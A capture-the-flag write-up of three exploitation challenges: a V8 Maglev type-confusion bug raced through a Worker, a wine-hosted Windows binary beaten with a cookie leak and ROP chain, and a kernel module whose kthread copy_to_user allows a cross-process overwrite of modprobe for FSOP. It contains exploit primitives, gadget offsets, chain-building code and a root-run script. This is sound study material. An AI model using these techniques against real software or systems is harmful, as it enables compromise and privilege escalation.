## pwn - triforce (14 solves)

in this v8 chall, `d8` gets a new global function, called `triforce`. it requires one string argument, compares the same `Local<String>` handle
against three strings

```diff
+void Shell::Triforce(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  DCHECK(i::ValidateCallbackInfo(info));
+  Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() != 1) {
+    ThrowError(isolate, "The Triforce is missing!");
+    return;
+  }
+
+  if (!info[0]->IsString()) {
+    ThrowError(isolate, "The real Triforce is a String!");
+    return;
+  }
+
+  Local<String> triforce = info[0].As<String>();
+
+  Local<String> power =
+      String::NewFromUtf8Literal(isolate, "Power", NewStringType::kInternalized);
+
+  Local<String> wisdom =
+      String::NewFromUtf8Literal(isolate, "Wisdom", NewStringType::kInternalized);
+
+  Local<String> courage =
+      String::NewFromUtf8Literal(isolate, "Courage", NewStringType::kInternalized);
+
+  if (!triforce->StringEquals(power)) {
+    ThrowError(isolate, "You are lacking Power...");
+    return;
+  }
+
+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+
+  if (!triforce->StringEquals(wisdom)) {
+    ThrowError(isolate, "You are lacking Wisdom...");
+    return;
+  }
+
+  base::OS::Sleep(base::TimeDelta::FromSeconds(1));
+
+  if (!triforce->StringEquals(courage)) {
+    ThrowError(isolate, "You are lacking Courage...");
+    return;
+  }
+
+  hatenoCheese = false;
+  MaybeLocal<String> ret = Shell::ReadFile(isolate, std::getenv("FLAG"), false);
+  hatenoCheese = true;
+
+  if (ret.IsEmpty()) {
+    std::cerr << "Failed to read flag, please open a ticket.\n";
+    ThrowError(isolate, "Failed to read flag, please open a ticket.");
+    return;
+  }
+
+  info.GetReturnValue().Set(ret.ToLocalChecked());
+}
+
```

only after all three `StringEquals` checks pass, (comparision of `Local<String>` handles against three strings `"Power"`, `"Wisdom"` and `"Courage"`), `Shell::ReadFile($FLAG)` is called. your classic d8 file apis are removed but `Worker`, `print`, `printErr` and `triforce` are still exposed. for an ordinary immutable js string this is impossible because, well, a single value cannot simulatenously equal three different strings.
the core idea i initially got here was to race this,  to use the blocking sleep between the checks, maybe another thread can mutate the string object during those sleep windows, and the same JS value can match the three desired.

we can see that the entire function `GetCheckType(NodeType type, ValueNode* target)` is omitted out. the initial logic of the function is that if Maglev knows that a value is a heap object using `if (NodeTypeIs(type, NodeType::kAnyHeapObject))`, it marks `Phi` nodes accordingly and skips inserting a runtime heap object check. otherwise, it just emitted a heap object check. `CheckType::kCheckHeapObject` is a directive which ensures that a javascript value is an actual allocated object and not a raw integer. we can see that this entire check is omitted out and instead maglev always makes an unsafe assumption that all nodes passed into the function are interpreted as heap objects without any further checks.

### maglev bug used for cage r/w

the above misinterpration matters a ton because a loop phi that is numerically used can be represented as `Float64` and later retagged with `kCanonicalizeSmi`, so we can use

```js
function tr(val, t) {
  let phi = val;
  for (let i = 0; i < 100000; i++) phi = phi + 0.0;
  t.p = phi;
}
```

after maglev tiers up, calling `tr(make_heapnum(K), target)` writes a raw Smi `K` into `target.p` despite the fact that later optimized code still treats `target.p` as a heap object. hence if `target.p = Smi(K)`, the raw tagged value becomes `2*K` and maglev map load at `heap_object - 1` reads `cage[2*K-1]`. the Smi check is gone but the map equality check still runs. choose `K` so that `2*K-1` lands inside controlled one byte string char data, we can make maglev believe that a Smi is a valid JSArray.

### primitives

#### p1

we warm `trigger()` to maglev, then call it with a heap number containing `K`. `target.p` becomes the Smi value `K`

#### p2

we warm several copies of 

```js
function rd(o, i) {
  return o.p.charCodeAt(i);
}
```
and then we put `targeet.p=Smi(5)` with p1. the optimized string path treats it as a string object and reads from compressed cage offset `0x15+i`, which gives us a byte read for cage offset at and above `0x15`. during testing i have had problems with burning the buggy maglev version, so i had to rotate through 16 reader functions, since later tiering was destroying me.

#### p3

we can create an object with three recogfnizable Smi marker fields


```js
{ _M1: 0xc0ffee, _M2: 0x1ee777, _M3: 0xbe9bed }
```

and we scan the cage for those three Smivalues. from the object address, we can locate the nearby array that contains two references to that object. and wonce we figure out the arrays element `FixedArray`, which leaks compressed tagged object pointers

```js
function addrof(o) {
  lkar[0] = o;
  return r32(r32(lkar_addr + 8) - 1 + 8);
}
```

#### p4 arbitrary 8 byte cage write

to solve for flag 1 we need odd values such as string lengths `5` and `7` so a Smi only 4 byte write is not enough, which made me cry. the working primitive i found is a Float64 FixedDoubleArray write. we can create two fake objects using one byte string char data,

1. `s_helper` which contains a fake FixedDoubleArray header and is retried until the fake fda is 8 byte aligned
2. `s_payload_d` which contains bytes that force the off by one map check see a real `PACKED_DOUBLE_ELEMENTS` JSArray map and its elements pointer points at the fake fda inside `s_helper`

consequently, `writer_d(o, i, v) { o.p[i] = v; }` is warmed on a real double array. after p1 sets `target_d.p = Smi(K_d)`, maglev believes `target_d.p` is the fake double array and a store to `o.p[i]` writes eight controlled bytes at

```text
fakefdabase + 8 + 8*i
```

so we wrap this like

```js
function aw64(addr, lo32, hi32) {
  const off = (addr - FDA_BASE) >>> 0;
  if ((off & 7) !== 0) throw new Error("shit");
  writer_d(target_d, off / 8, makeDouble(lo32, hi32));
}
```

### why we need a worker

the function `triforce(s)` sleeps inside native code. the threat that calls it cannot run js while it is blocked in `base::OS::Sleep` therefore we can use a `Worker` for the blocking call, while the main thread performs the timed memory writes. a very useful property here is that this d8 build shares the pointer compressioncage between the main isolate and Worker isolates. a cage offset found by main can point into an object allocated by the Worker, and mains cage write is immediately visible to him.

### exploit chain

1. main builds p1, p2, p3 and p4
2. worker creates a fresh `SeqOneByteString` which contains a 32 byte magic marker
3. worker signals main and waits
4. main scans the shared cage for magic bytes, the strings char data begins at `s_addr+0xc` so the string object is at `chars_off-0xc`
5. main verifies th object is a `SeqOneByteString` and that its length is the expected marker length
6. main writes `"Power"` into the worker string before the call starts

 ```text
   s + 0x08: length = 5
   s + 0x0c: "Powe"
   s + 0x10: "r\0\0\0<iomittedthis>"
```

7. main signals the worker and worker calls `triforce(s)`
8. at about `+500ms` while `triforce` is sleeping after the `"Power"` check, main writes `length = 6; chars = "Wisdom"`
9. at some time after while `triforce` is sleeping after the `"Wisdom"` check, main writes `length = 7; chars = "Courage"`
10. the third comparision passes and we get the flag

for the timed writes i used `Atomics.wait` for delay because it does not allocate and does not disturb the fake object layout

## pwn - ret2win
 
despite the name this is not classic rop emporium ret2win. there is no `win()` function to jump to, there is nothing to `ret2` (haha get it? ret to). `chall.exe` is a windows PE x86-64 that runs under `wine` inside `nsjail` inside docker, and the "win" you have to reach is reading a file the jail bind mounts as read only. the trick of the chall is that it is a windows binary, but the exploitation environment is linux+wine so any assumptions i had about the challenge were quite frankly wrong
 
```text
chall.exe: PE32+ executable (console) x86-64, for MS Windows
ImageBase: 0x140000000
DllCharacteristics: 0x8160   -> DYNAMIC_BASE (aslr) + NX + HIGH_ENTROPY_VA
/GS on (stack cookie)
```
 
the wrapper strips `FLAG` from the env and instead bind mounts the flag at `/home/user/flag` read only, and it deletes every `.exe` under `system32` and `syswow64` inside the wine prefix
 
```dockerfile
RUN wineboot 2>/dev/null && \
    rm /home/user/.wine/drive_c/windows/system32/*.exe /home/user/.wine/drive_c/windows/syswow64/*.exe
```
 
so there is no `cmd.exe`, which means `system()` and `WinExec` are dead on arrival, they have nothing to spawn. the flag is a FILE, so the intended path is a file read, not command execution. keep that in mind, i wasted a good hour ignoring it.
 
### the functions
 
three functions matter and i renamed them from the ida db. `sub_140001070` is a `readline` helper, it is just `fgets(buf, 0x12c, stdin)` with a `strcspn` newline strip afterwards
 
```text
sub_140001070 (readline):
  edx = 0x12c (=300)          ; fgets length
  call fgets(buf, 300, stdin)
  strcspn(buf, "\n") -> strip
```
 
`sub_1400010D0` prints `Enter your phrase: `, `malloc(0x12c)`s a 300 byte heap chunk and reads your phrase into it. `sub_140001110` is the vuln, it prints `Enter the path to save the art: ` and reads a line into a stack buffer
 
```text
sub_140001110 (vuln):
  0x140001110: sub rsp, 0x138
  0x140001117: mov rax, [__security_cookie]
  0x14000111e: xor rax, rsp
  0x140001121: mov [rsp+0x130], rax        ; ckie
  0x14000113a: lea rcx, [rsp+0x30]         ; &v2[0]
  0x14000113f: call readline               ; fgets(v2, 300, stdin)
  0x14000117b: add rsp, 0x138
  0x140001182: ret
```
 
### the bug
 
`readline` calls `fgets` with length `0x12c` = 300 bytes and the buffer inside the vuln lives at `rsp+0x30`, the encoded cookie lives at `rsp+0x130`. that is a distance of exactly `0x100` = 256 bytes
 
```text
v2[256] | encoded_cookie(8) | omitted for clarity | saved_rip
```
 
so a 300 byte read into a 256 byte buffer gives us 8 bytes of cookie plus 8 bytes of saved RIP plus a couple extra qwords of slack. classic stack smash, except /GS is on, so we cannot just splat the RIP, we have to keep the cookie intact. which means we need to leak it first
 
### cookie leak
 
this is the fun part, main copies your mallocd phrase into a big stack buffer before the vuln runs, through `sub_140001000`, which is basically
 
```text
sub_140001000(dest, src, n):
  dest[0] = 0
  if (n >= 0x163):
    strcpy(dest, <ascii art header>)     ;  art write at dest+0
    strncpy(dest + 0x162, src, n-0x163+1) ; phrase copy
```
 
main calls it with `n = 0x260` so it does `strncpy(dest+354, phrase, 254)`. `strncpy` does not null terminate if the source is `>=` the count so if we send a phrase of exactly 254 non null bytes, the region `dest+354 to dest+608` never gets a terminator, and the following `puts(dest)` (in `sub_140001190`) walks straight off the end of the art+phrase and into main's saved `__security_cookie XOR rsp_main`
 
```js
marker = b"A" * 254
```
 
MSVC picks cookies with the top 16 bits zeroed, so the two high bytes are `\x00\x00` and `puts` stops there anyway. that means 6 leaked bytes are enough to rebuild the full encoded cookie
 
<Callout>
what we leak is main's ENCODED cookie (`real_cookie XOR rsp_main`), not the ok one but the vuln stores its own encoded cookie as `real_cookie XOR rsp_sub`. same `real_cookie` but a different rsp so `sub_cookie = main_cookie XOR (rsp_main XOR rsp_sub)`
</Callout>
under wine the stack is stable across spawns, so the rsp delta is a constant:
 
```text
main_rsp = 0x7ffffe1ffc90
sub_rsp  = 0x7ffffe1ffb50
ckdelta = main_rsp ^ sub_Rsp = 0x7c0
```
 
so `sub_cookie = main_cookie ^ 0x7c0` and we can write it back into the overflow at the right offset and sail past the /GS check
 
### why wine actually just makes this easy
 
the binary has aslr on (`DYNAMIC_BASE`), but wines loader is deterministic per boot. the windows stack, the malloc heap and every DLL base come up at the same virtual address on every connection, because the docker image is frozen and wine maps its PE modules at fixed slots
 
```text
main_rsp_after_sub = 0x7ffffe1ffc90
sub_rsp_after_sub  = 0x7ffffe1ffb50
v2 buffer base     = 0x7ffffe1ffb80
malloc heap        = 0x7ffffe2283c0
 
kernel32   = 0x6fffffa20000
kernelbase = 0x6fffff3d0000
ucrtbase   = 0x6ffffea30000
ntdll      = 0x6fffffc00000
```
 
so no infoleak of a DLL base is needed. this is a windows binary but it is aslr off in practice. the only real leak we need is the cookie, which we already covered
 
### gadgets we use
 
everything comes from the wine system DLLs, since chall.exe itself is tiny
 
```text
pop rcx; ret                                             kernel32   +0x14f80
pop rdx; ret                                             kernelbase +0x47803
pop r8; add rsp 0x20; pop rbx; pop rsi; pop rdi; ret     ntdll      +0x17242
add rsp, 0x28; ret                                       kernel32   +0x1511d
pop rsp; ret                                             kernel32   +0x16553
```
 
the windows x64 calling convention wants args in `rcx, rdx, r8, r9` and the caller must reserve 0x20 of shadow space hence every "call a function" pops the args, land on the function, and then a `add rsp, 0x28; ret` to skip the shadow space + return slot the callee eat up before continuing the chain
 
```python
def block_call_2arg(F, a, b):
    return p64(POP_RCX_RET) + p64(a) + p64(POP_RDX_RET) + p64(b) + p64(F) \
         + p64(ADD_RSP_28_RET) + p64(junk)*5
```
 
### rop chain (2 stage)
 
the vuln buffer is only 256 bytes, which is not a lot of room for a full windows-cc chain with shadow gaps therefore again stage 1 is tiny because it just reads a much bigger stage 2 into a scratch page and pivots there
 
#### stage 1 (in v2, fits 256 bytes)
 
we call `_read(0, STAGE2, 0x400)` to pull the second stage from stdin into a fresh writable page inside the wine stack region, then we `pop rsp; ret -> STAGE2` to pivot the whole stack into it
 
```python
STAGE2 = 0x7ffffe1f0000 
stage1  = block_call_3arg(F_READ, 0, STAGE2, 0x400)
stage1 += p64(POP_RSP_RET) + p64(STAGE2)
```
 
#### stage 2 (in STAGE2, plenty of room)
 
now we have all the space we want. the intended win is a file read and no `cmd.exe` means no exec, so we go straight for the flag file, i tried shenanigans with popping a shell, but oh well
 
```python
_open("Z:\\home\\user\\flag", 0)   
_read(3, out_buf, 0x60)             
puts(out_buf)                        
```
 
the linux path `/home/user/flag` is reachable from wine as `Z:\home\user\flag` (i was stuck here for 20 mins but turns out `Z:` drive is wine's view of `/`). `puts` writes to stdout which the wrapper has connected to the socket, so the flag bytes come straight back to us, moreover `puts` is the last call so we do not bother with a clean ret.
a slick version  skips `_open`/`_read` entirely and reuses the binarys own `readline` against a redirected stdin
 
```python
freopen("Z:\\home\\user\\flag", "r", stdin)   
readline(heap)                                  
puts(heap)                                      
```
 
both land the flag but i prefer the `freopen` one because it needs fewer gadgets and reuses `sub_140001070`
 
### rabbit holing with the env var
 
the first thing i tried, because it is the shortest chain imaginable, was
 
```text
GetEnvironmentVariableA("FLAG", buf, n)
puts(buf)
```
 
one 2arg call and a print, no stage 2, fits in the 256 byte buffer easily. it returned 0 every single time. took me way too long to actually read the wrapper, which does exactly this
 
```text
/root/wrapper strips FLAG from env before exec chall.exe
(only kept if FLAG_IN_ENV=1, which it is not)
```
 
so `GetEnvironmentVariableA` had nothing to find because the flag only ever exists as the bind mounted `/home/user/flag`, which is why the file read path is the intended one. lesson learned here is to read the jail before writing exploit
 
### exploit chain
 
1. send a 254 byte phrase so `strncpy` leaves it unterminated
2. `puts` over reads and hands back 6 bytes of main's encoded cookie
3. rebuild `main_cookie`, derive `sub_cookie = main_cookie ^ 0x7c0`
4. overflow the vuln by stage 1 chain + correct `sub_cookie` at `+0x130` + saved RIP -> `pop rsp; ret` -> `&v2`
5. stage 1 runs `_read(0, STAGE2, 0x400)` and pivots into STAGE2
6. feed stage 2 over stdin with `freopen(flag, "r", stdin)` then `readline` then `puts`
7. flag comes back down the socket
```text
TRX{w1n3_15_d1ff3r3n7_fr0m_w1nd0w5_15n7_17}
```

## pwn - krwd
 
<Callout>
did not manage to land this one during the ctf, i upsolved it after the ctf ended with a hint from another participant regarding what to focus on. i put a lot of hours into it, went down a very deep hole in completely the wrong direction, and never got a shell, sad. what follows is the intended solve (credit to the author, prosti, whose writeup lives on kqx.io) plus an honest account of the rabbit hole i dug for myself, because the gap between the two is the whole lesson of this chall
</Callout>
krwd is a linux kernel module challenge. the module gives you kernel buffers (`kbufs`) that you read and write through "requests" (`krequests`), and the twist is that the requests are not executed synchronously in your ioctl. they are pushedx onto a workqueue and run later, asynchronously, from a kernel worker thread
 
```c
#define CHALL_KBUF_SIZE            0x0400
#define CHALL_KBUFS_MAX_SIZE       0x0050
#define CHALL_KREQUESTS_MAX_SIZE   0x0020
 
enum krequest_type { TYPE_READ, TYPE_WRITE, TYPE_DELETE, TYPE_SET_WORK };
```
 
you `ADD_REQUEST` to register a read/write/delete against some `kbuf_idx`, then `SET_WORK` schedules that request with a delay
 
```c
case IOCTL_CHALL_SET_WORK:
    INIT_DELAYED_WORK(&krequests[idx].dwork, request_handler);
    schedule_delayed_work(&krequests[idx].dwork, msecs_to_jiffies(time));
```
 
and `request_handler`, running on the workqueue, is the thing that actually does the copy
 
```c
case TYPE_READ:
    copy_to_user(kreq->info.rw.ubuf, kbuf->buf, size);
    break;
case TYPE_WRITE:
    copy_from_user(kbuf->buf, kreq->info.rw.ubuf, size);
    break;
```
 
environment is `qemu64 +smap +smep +fsgsbase`, `-smp 1`, kernel `6.17.0`, `pti=on`, `panic=-1`. single cpu matters a lot, hold that thought
 
### the bug (intended)
 
there are no BOFs, everything is under one `chall_ctx_mutex`, so there is apparently no race. `check_perms` looks airtight, which is the reason i decided to discard this idea initially and seek something else. from the kqx blog:

```
> what happens if you use `copy_{from,to}_user` in a kernel thread?
 ```

and the answer is the entire challenge. a kernel thread has no address space of its own, `task->mm == NULL`. what it actually runs with is `active_mm`, a borrowed user address space, whichever user process was last on this cpu. the scheduler leaves that mm installed (with its CR3) until it has a reason to switch it out
 
<Callout>
so when the workqueue worker executes `copy_to_user(ubuf, kbuf, size)`, `ubuf` is resolved against whatever process happens to be the current `active_mm` on that cpu which is not necessarily the process that submitted the request since it can be a completely different, more privileged process memory
</Callout>
hence the primitive isnt a corruption one, but one of semantic origin. `copy_to_user` from a kthread is a cross process arbitrary write into whoevers mm is currently borrowed, and you get to pick the delay so you control (statistically) when it fires. this behaviour is basically undocumented for workqueues, you only really find it by reading the scheduler's `context_switch`/`enter_lazy_tlb` path, so cruel yet so beautiful
 
### turning that into root
 
the plan writes itself once you accept the primitive
 
1. get a privileged process running on the cpu
2. time a `TYPE_READ` so the worker's `copy_to_user` lands while that process is the `active_mm`
3. `copy_to_user(target_in_victim, kbuf_full_of_payload, PAGE_SIZE)` overwrites victim memory with data we staged into a kbuf
the victim of choice is `/sbin/modprobe` and the kernel spawns it as root whenever a missing module is requested, and you can trigger that trivially from userland:
 
```c
for(;;) socket(22, SOCK_DGRAM, 0);   
/sbin/modprobe
```
 
on this box `/sbin/modprobe` is a symlink to busybox, which is static and no PIE (the author even shipped it with symbols). no PIE means `_IO_2_1_stdout_` sits at a fixed address, no leak needed
 
```c
#define STDOUT_ADDRESS 0x657440
```
 
so we overwrite modprobe's `_IO_2_1_stdout_` FILE struct with a crafted one and let a simple angry FSOP run `system("/tmp/e")` when modprobe flushes stdout on exit. because busybox is static, `__dlopen` is defined, which means the static branch of `_IO_vtable_check` bails out early
 
```c
#else /* !SHARED */
  if (__dlopen != NULL)
    return;   
#endif
```
 
so the vtable pointer check is effectively free, we don not even have to fight it. you can't `system("/bin/sh")` here because modprobe has no interactive stdio, so instead you point it at a dropped script
 
```sh
#!/bin/sh
cat /dev/sda > /tmp/flag.txt
```
 
`/dev/sda` is the raw flag disk (`-drive file=flag.txt,if=ide`), and modprobe runs as root, so this just copies the flag out where our unprivileged process can read it
  
```c
fsop_payload[5] += 1; // look at _IO_flush_all to understand why we need this lmao
```
 
classic FSOP off by one on the buffer pointer field so the flush path takes the branch that reaches the call
 
### exploit chain
 
1. drop `/tmp/e` with the root commands you want
2. spray `TYPE_WRITE` requests to stuff the FSOP payload into the kbufs (this copy reads from your mm, which is fine, ur the one running)
3. queue a pile of `TYPE_READ` requests, all pointing `ubuf` at `_IO_2_1_stdout_` (`0x657440`) inside the victim
4. `SET_WORK` them with staggered delays (`1000 + i*10` ns) so they don't all fire at once and you get many shots at the timing window
5. spam `socket(22, )` in a child to keep modprobe on the cpu
6. on a lucky window the workers `copy_to_user` runs while modprobe is the `active_mm`, and the FSOP lands. modprobe exits, flushes stdout, and `system("/tmp/e")` runs as root
7. read `/tmp/flag.txt`
```text
TRX{0h_s0_y0u_d0_und3rst4nd_h0w_kthr34ds_w0rk!_cd454889c85c415b}
```
 
### rabbit holing (my entire experience, basically)
 
the description says "the solution to all your problems is right here -> https://kqx.io", and i read that as a pointer at qemu TCG emulation bugs rather than as the authors blog so i convinced myself the intended path was a memory corruption primitive and went hunting for one
 
things i confirmed on a local qemu 8.2.2 (with the TCG bug present) and then could not carry to prod
 
- `iretq` arbitrary-read leak via `gregs[REG_ERR]` byte-1 works, but only for CEA mapped pages. i leaked `IDT[1]`'s handler bytes and recovered kbase (`0xffffffffa3c01310 to 0xffffffffa3c00000`). felt pretty great but led to nowhere
- a hardware bp (`PTRACE`) path that leaked a DB stack entry and gave me a physmap base in the `0xffff909100000000` form
- `lcall *m16:64` to push into physmap is dead under `pti=on`. physmap is not in the user CR3, so the implicit push faults before any TCG trick can land bytes, kernel just logs `BUG: unable to handle page fault for address: <physmap+off>` and my exp dies which is the same reason the `iretq` physmap leak dies
then i pivoted to the module's own `schedule_delayed_work` and found a genuine double add timer wheel race where `INIT_DELAYED_WORK` clears `timer.entry = {NULL,NULL}` without unlinking, then `schedule_delayed_work` re enqueues, so the later `detach_timer` does
 
```text
__hlist_del:
  *pprev = next               
  next->pprev = pprev         
```
 
confirmed the exact oops `general protection fault to non-canonical address 0xdead00000000012a to RIP: __run_timers+0x1bd`. but every write this race produces targets per cpu memory or the module .bss, never slab, and the values are fixed (`LIST_POISON2`, a `.bss` address). i sprayed 256x `msg_msg(1024)` looking for a kernel pointer to leak off the back of it and got 0 hits with the safe trigger, the aggressive trigger reboots before i can read anything because `panic=-1`. i also tried the fresh `kreq[31]` trick where a request slot that was never `ADD_REQUEST`'d still has `uid=0, gid=0, info=0` from the static init, and `check_perms` has a root bypass. so `SET_WORK` on it runs the handler as root. this is cute, but a zero length `copy_to_user(NULL,)` does nothing and i could not build it into anything, because i was still thinking about buffer ownership rather than whose mm the copy runs against
